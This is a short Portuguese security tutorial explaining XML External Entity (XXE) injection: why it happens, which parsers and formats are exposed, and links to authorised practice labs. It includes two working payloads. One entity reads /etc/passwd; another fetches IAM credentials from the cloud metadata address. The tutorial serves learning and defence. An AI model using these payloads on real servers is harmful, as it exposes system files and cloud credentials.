# XML External Entity
### O XXE (XML External Entity) é uma vulnerabilidade de segurança que afeta aplicações que processam arquivos ou dados no formato XML.
Ela permite que um atacante interfira no processamento desses dados, podendo levar à leitura de arquivos internos do servidor, ataques SSRF e, em casos raros, execução remota de código.

---
### Cenários
A falha ocorre porque o padrão XML permite a definição de Entidades Externas. Uma entidade é basicamente um "atalho" ou variável. O problema surge quando o processador XML da aplicação está configurado para aceitar e resolver essas entidades externas sem a devida validação.  
**Quando ocorre:**
* Quando a aplicação aceita entradas XML de usuários.
* Quando o analisador (parser) XML está mal configurado (com suporte a DTD e Entidades Externas habilitado).
* Em integrações de APIs que usam protocolos baseados em XML, como SOAP ou até formatos de arquivos como DOCX e SVG (que são XML por baixo dos panos).

### Exploração
Há diversas formas de explorar uma falha de XXE, principalmente pelo fato de ela nunca estar sozinha — vem acompanhada de outra vulnerabilidade. A seguir, veja alguns exemplos de exploração:  

1. **LFI**  
Ao invés de exibir um ID de um produto, o arquivo do `/etc/passwd` será retornado.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
---
2. **SSRF**  
O atacante força o servidor a realizar uma requisição para um serviço interno da rede que não deveria estar disponível externamente.
```xml
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> 
]>
```
*Obs.: O IP 169.254.169.254 é um endereço padrão usado por provedores de nuvem para fornecer informações da instância.*

### Laboratórios Práticos
**Para um pouco de prática, irei listar algumas possibilidades de exploração de forma autorizada:**  
* [Laboratórios do PortSwigger](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
* [TryHackMe](https://tryhackme.com/room/xxeinjection)
* [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
